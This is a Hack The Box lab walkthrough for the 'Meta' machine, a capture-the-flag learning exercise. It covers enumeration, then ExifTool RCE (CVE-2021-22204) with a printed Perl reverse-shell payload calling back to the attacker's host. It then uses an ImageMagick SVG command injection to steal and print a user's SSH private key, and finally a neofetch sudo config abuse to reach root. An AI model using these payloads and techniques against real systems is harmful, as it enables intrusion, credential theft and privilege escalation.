---
tags:
  - CVE-2021-22204
  - CVE-2020-29599
  - env_keep
  - imagemagick
group: Linux
---
![](https://0xdfimages.gitlab.io/img/meta-cover.webp)

- Machine : https://app.hackthebox.com/machines/meta
- Reference : https://0xdf.gitlab.io/2022/06/11/htb-meta.html
- Solved : 2025.3.12. (Wed) (Takes 2days)

## Summary
---

1. **Initial Enumeration**
    - **Open Ports**: TCP 22 (SSH), TCP 80 (HTTP).
    - **Identified Domain**: `artcorp.htb`
    - **Discovered Services**:
        - OpenSSH 7.9p1
        - Apache HTTP Server (redirects to `artcorp.htb`)
    - **Directory & Subdomain Discovery**:
        - Found `/assets`, `/css`, and `dev01.artcorp.htb` (via `gobuster` & `wfuzz`).
        
2. **Web Exploitation**
    - **MetaView File Upload (ExifTool)**:
        - Image upload feature runs `exiftool` and displays metadata.
        - Exploited **CVE-2021-22204 (ExifTool RCE)** by uploading crafted image.
        - Got **reverse shell as `www-data`**.
        
3. **Shell as `www-data`**
    - **Privilege Escalation via ImageMagick (CVE-2020-29599)**:
        - Observed cron job runs `convert_images.sh` using `mogrify`.
        - Exploited SVG file with ImageMagick command injection.
        - Leaked content of `/home/thomas/.ssh/id_rsa`.
        - SSH login as **`thomas` user using stolen private key**.
        
4. **Shell as `thomas`**
    - **Sudo Misconfiguration in `neofetch`**:
        - `thomas` can run `/usr/bin/neofetch ""` as root via `sudo`.
        - Abused `XDG_CONFIG_HOME` and replaced neofetch config with `exec /bin/sh`.
        - Executed neofetch to gain **`root` shell**.

### Key Techniques:

- **Subdomain Fuzzing**: Used `wfuzz` to discover `dev01.artcorp.htb`.
- **ExifTool RCE (CVE-2021-22204)**: Arbitrary command execution via image metadata.
- **ImageMagick RCE (CVE-2020-29599)**: SVG command injection via `mogrify`.
- **SSH Private Key Theft**: Extracted `.ssh/id_rsa` and accessed user shell.
- **Sudo Misconfiguration Abuse**: Leveraged `XDG_CONFIG_HOME` with `neofetch` for root shell.

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb/meta]
└─$ /opt/custom-scripts/port-scan.sh 10.10.11.140
[*] Performing quick TCP port scan on 10.10.11.140...
[*] Performing quick UDP port scan on 10.10.11.140 (top 1000 UDP ports)...
[+] Found open TCP ports: 22,80
[*] Performing detailed TCP scan on 10.10.11.140...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-11 09:13 MDT
Nmap scan report for 10.10.11.140
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://artcorp.htb
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- 2 tcp ports are open.
- Domain name is `artcorp.htb`. Let's add this to `/etc/hosts`.

### http(80)

![](attachments/meta_1.png)

The site looks normal. But has no useful link.

![](attachments/meta_2.png)

Three employee(er)s are found.

```bash
┌──(kali㉿kali)-[~/htb/meta]
└─$ gobuster dir -u http://artcorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://artcorp.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 234] [--> http://artcorp.htb/assets/]
/css                  (Status: 301) [Size: 231] [--> http://artcorp.htb/css/]
```

Let's fuzz subdomains.

```bash
┌──(kali㉿kali)-[~/htb/meta]
└─$ wfuzz -u http://10.10.11.140 -H "Host: FUZZ.artcorp.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 0
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.140/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000001492:   200        9 L      24 W       247 Ch      "dev01"  
```

There's another subdomain found : `dev01.artcorp.htb`
Let's visit the domain.

![](attachments/meta_3.png)

It says the application is in development yet.
I clicked the link "MetaView".

![](attachments/meta_4.png)

I uploaded a random image file for test, and clicked "Upload".
Then I can see the following result.

![](attachments/meta_5.png)

It's part of a result of `exiftool` command.
I checked with the tool on command line, and the result was the same.

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ exiftool falafel.png
ExifTool Version Number         : 13.00
File Name                       : falafel.png
Directory                       : .
File Size                       : 69 kB
File Modification Date/Time     : 2025:03:07 00:50:36-07:00
File Access Date/Time           : 2025:03:11 15:06:48-06:00
File Inode Change Date/Time     : 2025:03:07 00:50:36-07:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 420
Image Height                    : 236
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
White Point X                   : 0.31269
White Point Y                   : 0.32899
Red X                           : 0.63999
Red Y                           : 0.33001
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.05999
Image Size                      : 420x236
Megapixels                      : 0.099
```

I tried to find if there's a upload folder using `gobuster`, but it's not loadable.

```bash
┌──(kali㉿kali)-[~/htb/falafel]
└─$ gobuster dir -u http://dev01.artcorp.htb/metaview -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev01.artcorp.htb/metaview
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 250] [--> http://dev01.artcorp.htb/metaview/uploads/]
/assets               (Status: 301) [Size: 249] [--> http://dev01.artcorp.htb/metaview/assets/]
/css                  (Status: 301) [Size: 246] [--> http://dev01.artcorp.htb/metaview/css/]
/lib                  (Status: 301) [Size: 246] [--> http://dev01.artcorp.htb/metaview/lib/]
/vendor               (Status: 301) [Size: 249] [--> http://dev01.artcorp.htb/metaview/vendor/]  
```



# Shell as `www-data`

### Exploit `exiftool`

Instead, I found "Arbitrary Code Execution" vulnerability :
https://github.com/UNICORDev/exploit-CVE-2021-22204

It has limited coverage for the tool's version but let's just try it.

```bash
┌──(kali㉿kali)-[~/htb/meta/exploit-CVE-2021-22204]
└─$ python exploit-CVE-2021-22204.py -c 'whoami'
/home/kali/htb/meta/exploit-CVE-2021-22204/exploit-CVE-2021-22204.py:89: SyntaxWarning: invalid escape sequence '\c'
  payload = "(metadata \"\c${"

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution
PAYLOAD: (metadata "\c${system('whoami')};")
DEPENDS: Dependencies for exploit are met!
PREPARE: Payload written to file!
PREPARE: Payload file compressed!
PREPARE: DjVu file created!
PREPARE: JPEG image created/processed!
PREPARE: Exiftool config written to file!
EXPLOIT: Payload injected into image!
CLEANUP: Old file artifacts deleted!
SUCCESS: Exploit image written to "image.jpg"
```

I crafted a image with `whoami` command injected.

![](attachments/meta_6.png)

Then the response includes `www-data` which is the response of the command.

Let's create another image with reverse shell payload this time.

```bash
┌──(kali㉿kali)-[~/htb/meta/exploit-CVE-2021-22204]
└─$ python exploit-CVE-2021-22204.py -s 10.10.14.7 9000  
/home/kali/htb/meta/exploit-CVE-2021-22204/exploit-CVE-2021-22204.py:89: SyntaxWarning: invalid escape sequence '\c'
  payload = "(metadata \"\c${"

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2021-22204 (ExifTool) - Arbitrary Code Execution
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(9000,inet_aton('10.10.14.7')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")                                                      
DEPENDS: Dependencies for exploit are met!
PREPARE: Payload written to file!
PREPARE: Payload file compressed!
PREPARE: DjVu file created!
PREPARE: JPEG image created/processed!
PREPARE: Exiftool config written to file!
EXPLOIT: Payload injected into image!
CLEANUP: Old file artifacts deleted!
SUCCESS: Exploit image written to "image.jpg"
```

Then, the listener soon spawns a shell.

```bash
┌──(kali㉿kali)-[~/htb/meta/exploit-CVE-2021-22204]
└─$ nc -nlvp 9000                                        
listening on [any] 9000 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.140] 49750
/bin/sh: 0: can't access tty; job control turned off

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ whoami
www-data
```

I got a shell as `www-data`!



# Shell as `thomas`

### Enumeration

Let's run `linPEAS`.

```ruby
╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                            
Sudo version 1.8.27 



╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash                                              
thomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bash
```

Initially, I noticed that the `sudo` version is outdated.

I tried PoC found from [exploit-db](https://www.exploit-db.com/exploits/47502), but it was not working.

```bash
www-data@meta:/tmp$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash                                                         
sudo: unknown user: #-1                                                      
sudo: unable to initialize policy plugin
```

Instead, I uploaded `pspy64` to observe more details.

```bash
www-data@meta:/tmp$ ./pspy64
./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...

...SNIP...

2025/03/11 17:56:01 CMD: UID=0     PID=19801  | /usr/sbin/CRON -f 
2025/03/11 17:56:01 CMD: UID=0     PID=19802  | cp -rp /root/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf
2025/03/11 17:56:01 CMD: UID=0     PID=19803  | /usr/sbin/CRON -f 
2025/03/11 17:56:02 CMD: UID=1000  PID=19804  | 
2025/03/11 17:56:02 CMD: UID=1000  PID=19805  | /bin/bash /usr/local/bin/convert_images.sh
2025/03/11 17:56:02 CMD: UID=0     PID=19806  | /bin/sh -c rm /tmp/* 
2025/03/11 17:56:02 CMD: UID=1000  PID=19807  | /bin/bash /usr/local/bin/convert_images.sh  
```

`/usr/local/bin/convert_images.sh` seems to be run every minute.
Let's read what this script is.

```bash
www-data@meta:/tmp$ cat /usr/local/bin/convert_images.sh  
cat /usr/local/bin/convert_images.sh  
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
```

### Exploit `mogrify` (CVE-2020-29599)

I found an article explaining RCE vulnerability :
https://www.virsec.com/resources/blog/cve-2020-29599-imagemagick-command-injection

Let's check `mogrify`'s version.

```bash
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ mogrify --version
mogrify --version
Version: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org
Copyright: © 1999-2020 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib
```

According to the reference, I can trigger command injection via "authenticate" function in SVG file.

Before that, I checked if the directory to put the payload is writable, and it was.

```bash
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls -al /var/www/dev01.artcorp.htb/convert_images/
<$ ls -al /var/www/dev01.artcorp.htb/convert_images/     
total 8
drwxrwxr-x 2 root www-data 4096 Jan  4  2022 .
drwxr-xr-x 4 root root     4096 Oct 18  2021 ..
```

Then, I prepared a PoC payload as follows, and uploaded to the target.

```xml
┌──(kali㉿kali)-[~/htb/meta]
└─$ cat poc.svg                         
<image authenticate='ff" `echo $(id)> /dev/shm/poc`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Then, I can soon find `poc` file in `/dev/shm` directory.

```bash
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls /dev/shm
poc


www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /dev/shm/poc
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
```

It seems that the user `thomas` has RSA private key in its home directory.

```bash
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls -al /home/thomas

total 32
drwxr-xr-x 4 thomas thomas 4096 Jan 17  2022 .
drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..
lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -> /dev/null
-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout
-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc
drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config
-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile
drwx------ 2 thomas thomas 4096 Jan  4  2022 .ssh
-rw-r----- 1 root   thomas   33 Mar 11 11:10 user.txt
```

Since the user `thomas` seems to have SSH RSA key setting in its home directory, let's save the key using the payload.

```xml
┌──(kali㉿kali)-[~/htb/meta]
└─$ cat exploit.svg
<image authenticate='ff" `echo $(cat /home/thomas/.ssh/id_rsa)> /dev/shm/poc`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
  <image xlink:href="msl:poc.svg" height="100" width="100"/>
  </svg>
</image>
```

Then, I can fetch the RSA private key.

```bash
www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ cat /dev/shm/poc
cat /dev/shm/poc
-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5 x7up3z5s/H/yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k/rN9PFe/MkRsYdH45IvV qMgzqmJPFAdxmkD9WRnVP9OqEF0ZEYwTFuFPUlNq5hSbNRucwXEXbW0Wk7xdXwe3OJk8hu ajeY80riz0S8+A+OywcXZg0HVFVli4/fAvS9Im4VCRmEfA7jwCuh6tl5JMxfi30uzzvke0 yvS1h9asqvkfY5+FX4D9BResbt9AXqm47ajWePksWBoUwhhENLN/1pOgQanK2BR/SC+YkP nXRkOavHBxHccusftItOQuS0AEza8nfE5ioJmX5O9+fv8ChmnapyryKKn4QR4MAqqTqNIb 7xOWTT7Qmv3vw8TDZYz2dnlAOCc+ONWh8JJZHO9i8BXyHNwAH9qyESB7NlX2zJaAbIZgQs Xkd7NTUnjOQosPTIDFSPD2EKLt2B1v3D/2DMqtsnAAAFgOcGpkXnBqZFAAAAB3NzaC1yc2 EAAAGBALfSKCOYB7c/KJobGmfRsvsF8jWT6eYyWb2zifeOjiOINpEUQxw5uce7qd8+bPx/ 8ro4I4K6Djh4fcwQbomdSZ9Y5b3kTOx9VS27WPJP6zfTxXvzJEbGHR+OSL1ajIM6piTxQH cZpA/VkZ1T/TqhBdGRGMExbhT1JTauYUmzUbnMFxF21tFpO8XV8HtziZPIbmo3mPNK4s9E vPgPjssHF2YNB1RVZYuP3wL0vSJuFQkZhHwO48AroerZeSTMX4t9Ls875HtMr0tYfWrKr5 H2OfhV+A/QUXrG7fQF6puO2o1nj5LFgaFMIYRDSzf9aToEGpytgUf0gvmJD510ZDmrxwcR 3HLrH7SLTkLktABM2vJ3xOYqCZl+Tvfn7/AoZp2qcq8iip+EEeDAKqk6jSG+8Tlk0+0Jr9 78PEw2WM9nZ5QDgnPjjVofCSWRzvYvAV8hzcAB/ashEgezZV9syWgGyGYELF5HezU1J4zk KLD0yAxUjw9hCi7dgdb9w/9gzKrbJwAAAAMBAAEAAAGAFlFwyCmMPkZv0o4Z3aMLPQkSyE iGLInOdYbX6HOpdEz0exbfswybLtHtJQq6RsnuGYf5X8ThNyAB/gW8tf6f0rYDZtPSNyBc eCn3+auUXnnaz1rM+77QCGXJFRxqVQCI7ZFRB2TYk4eVn2l0JGsqfrBENiifOfItq37ulv kroghSgK9SE6jYNgPsp8B2YrgCF+laK6fa89lfrCqPZr0crSpFyop3wsMcC4rVb9m3uhwc Bsf0BQAHL7Fp0PrzWsc+9AA14ATK4DR/g8JhwQOHzYEoe17iu7/iL7gxDwdlpK7CPhYlL5 Xj6bLPBGmRkszFdXLBPUrlKmWuwLUYoSx8sn3ZSny4jj8x0KoEgHqzKVh4hL0ccJWE8xWS sLk1/G2x1FxU45+hhmmdG3eKzaRhZpc3hzYZXZC9ypjsFDAyG1ARC679vHnzTI13id29dG n7JoPVwFv/97UYG2WKexo6DOMmbNuxaKkpetfsqsLAnqLf026UeD1PJYy46kvva1axAAAA wQCWMIdnyPjk55Mjz3/AKUNBySvL5psWsLpx3DaWZ1XwH0uDzWqtMWOqYjenkyOrI1Y8ay JfYAm4xkSmOTuEIvcXi6xkS/h67R/GT38zFaGnCHh13/zW0cZDnw5ZNbZ60VfueTcUn9Y3 8ZdWKtVUBsvb23Mu+wMyv87/Ju+GPuXwUi6mOcMy+iOBoFCLYkKaLJzUFngOg7664dUagx I8qMpD6SQhkD8NWgcwU1DjFfUUdvRv5TnaOhmdNhH2jnr5HaUAAADBAN16q2wajrRH59vw o2PFddXTIGLZj3HXn9U5W84AIetwxMFs27zvnNYFTd8YqSwBQzXTniwId4KOEmx7rnECoT qmtSsqzxiKMLarkVJ+4aVELCRutaJPhpRC1nOL9HDKysDTlWNSr8fq2LiYwIku7caFosFM N54zxGRo5NwbYOAxgFhRJh9DTmhFHJxSnx/6hiCWneRKpG4RCr80fFJMvbTod919eXD0GS 1xsBQdieqiJ66NOalf6uQ6STRxu6A3bwAAAMEA1Hjetdy+Zf0xZTkqmnF4yODqpAIMG9Um j3Tcjs49usGlHbZb5yhySnucJU0vGpRiKBMqPeysaqGC47Ju/qSlyHnUz2yRPu+kvjFw19 keAmlMNeuMqgBO0guskmU25GX4O5Umt/IHqFHw99mcTGc/veEWIb8PUNV8p/sNaWUckEu9 M4ofDQ3csqhrNLlvA68QRPMaZ9bFgYjhB1A1pGxOmu9Do+LNu0qr2/GBcCvYY2kI4GFINe bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE= -----END OPENSSH PRIVATE KEY-----
```

After editing the key value as private key format, I opened a SSH shell using this key.

```bash
┌──(kali㉿kali)-[~/htb/meta]
└─$ ssh -i thomas.priv thomas@10.10.11.140      
The authenticity of host '10.10.11.140 (10.10.11.140)' can't be established.
ED25519 key fingerprint is SHA256:Y8C2lOecv5ZDp3I6M5zjDUYDVsc3p/pgjF9HVRPioqQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.140' (ED25519) to the list of known hosts.
Linux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

thomas@meta:~$ id
uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)

thomas@meta:~$ whoami
thomas
```

I got `thomas` shell!



# Shell as `root`

### sudo permission

The user `thomas` can do `sudo` command with `/usr/bin/neofetch` binary.

```bash
thomas@meta:~$ sudo -l
Matching Defaults entries for thomas on meta:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+=XDG_CONFIG_HOME

User thomas may run the following commands on meta:
    (root) NOPASSWD: /usr/bin/neofetch \"\"
```

`\"\"` blocks other parameters being added.

There's a configuration `env_keep+=XDG_CONFIG_HOME`.
`XDG_CONFIG_HOME` is a ENV variable to set user's configuration location.
It's currently not set.

```bash
thomas@meta:~$ echo $XDG_CONFIG_HOME

```

`neofetch` is a command line tool showing system info nicely.

```bash
thomas@meta:~$ sudo /usr/bin/neofetch
       _,met$$$$$gg.          root@meta 
    ,g$$$$$$$$$$$$$$$P.       --------- 
  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
 ,$$P'              `$$$.     Host: VMware Virtual Platform None 
',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
`d$$'     ,$P"'   .    $$$    Uptime: 41 mins 
 $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
 $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
 $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7763 64- (2) @ 2.445GHz 
 Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
 `$$b      "-.__              Memory: 114MiB / 1994MiB 
  `Y$$                                                                                       
   `Y$$.                                              
     `$$b.
       `Y$$b.
          `"Y$b._
              `"""
```

My first trial was using the code snippet referenced from GTFOBins.

```bash
TF=$(mktemp)
echo 'exec /bin/sh' >$TF
sudo neofetch --config $TF
```

But unlike my expectation, it kept asking password.

```bash
thomas@meta:~$ TF=$(mktemp)
thomas@meta:~$ echo 'exec /bin/sh' >$TF
thomas@meta:~$ sudo neofetch --config $TF

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for thomas: 
Sorry, try again.
```

Since the `sudo` permission doesn't allow additional parameters added, I need to use the default setting.

Referring to [this](https://github.com/dylanaraps/neofetch/wiki/Customizing-Info#config-file-location), default configuration location is set to `${HOME}/.config/neofetch/config.conf`.

I can see the file in `thomas`'s home directory.

```bash
thomas@meta:~$ ls -al
total 36
drwxr-xr-x 5 thomas thomas 4096 Mar 12 04:12 .
drwxr-xr-x 3 root   root   4096 Aug 29  2021 ..
lrwxrwxrwx 1 root   root      9 Aug 29  2021 .bash_history -> /dev/null
-rw-r--r-- 1 thomas thomas  220 Aug 29  2021 .bash_logout
-rw-r--r-- 1 thomas thomas 3526 Aug 29  2021 .bashrc
drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .config
drwx------ 3 thomas thomas 4096 Mar 12 04:12 .gnupg
-rw-r--r-- 1 thomas thomas  807 Aug 29  2021 .profile
drwx------ 2 thomas thomas 4096 Jan  4  2022 .ssh
-rw-r----- 1 root   thomas   33 Mar 12 03:55 user.txt


thomas@meta:~$ ls -al .config
total 12
drwxr-xr-x 3 thomas thomas 4096 Aug 30  2021 .
drwxr-xr-x 5 thomas thomas 4096 Mar 12 04:12 ..
drwxr-xr-x 2 thomas thomas 4096 Dec 20  2021 neofetch


thomas@meta:~$ ls -al .config/neofetch
total 24
drwxr-xr-x 2 thomas thomas  4096 Dec 20  2021 .
drwxr-xr-x 3 thomas thomas  4096 Aug 30  2021 ..
-rw-r--r-- 1 thomas thomas 14591 Aug 30  2021 config.conf
```

After backup the `config.conf` file, I overwrite it with prepared payload.

```bash
thomas@meta:~$ echo 'exec /bin/sh' > .config/neofetch/config.conf 

thomas@meta:~$ XDG_CONFIG_HOME=~/.config sudo neofetch

# bash

root@meta:/home/thomas# id
uid=0(root) gid=0(root) groups=0(root)

root@meta:/home/thomas# whoami
root
```

I got `root` shell!